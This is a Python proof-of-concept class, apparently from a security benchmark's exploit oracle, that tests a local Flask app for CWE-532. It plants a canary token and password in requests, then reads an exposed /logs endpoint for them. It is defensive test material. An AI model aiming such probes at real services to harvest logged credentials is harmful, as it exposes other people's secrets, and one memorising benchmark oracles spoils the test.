"""PoC: Sensitive data in logs via request body logging (CWE-532)."""
import uuid
from mosaic.oracle.exploit import ExploitTest

class LogLeakExploit(ExploitTest):
    def __init__(self, base_url="http://localhost:39120"):
        super().__init__(base_url)
    @property
    def chain_id(self): return "flask_log_sensitive_data"
    def setup(self): pass
    def execute(self):
        evidence = []
        secret = f"MOSAIC_SECRET_{uuid.uuid4().hex[:8]}"
        # Send a request with sensitive data in body
        self.http_post("/orders", json={
            "product_id": 1, "quantity": 1,
            "payment_token": secret,
            "password": "SuperSecret123!",
        })
        # Also send with auth header
        self.http_get("/products", headers={"Authorization": f"Bearer {secret}"})
        # Check if logs expose the secret
        resp = self.http_get("/logs")
        if not resp.ok:
            return False, f"Logs endpoint: {resp.status_code}"
        try:
            data = resp.json()
            logs = data.get("logs", [])
            evidence.append(f"Got {len(logs)} log entries")
            for entry in logs:
                body = str(entry.get("body", ""))
                headers = str(entry.get("headers", ""))
                if secret in body:
                    evidence.append(f"Secret token found in log body!")
                    return True, (
                        "CWE-532 Sensitive data in logs confirmed. "
                        "Request body with credentials visible in /logs endpoint. "
                        + " | ".join(evidence)
                    )
                if secret in headers:
                    evidence.append(f"Secret found in log headers!")
                    return True, (
                        "CWE-532 Auth header exposed in logs. "
                        + " | ".join(evidence)
                    )
                if "password" in body.lower():
                    evidence.append("Password field visible in logs")
                    return True, "CWE-532 Password in logs. " + " | ".join(evidence)
        except Exception as e:
            evidence.append(f"Parse error: {e}")
        return False, "No sensitive data in logs. " + " | ".join(evidence)
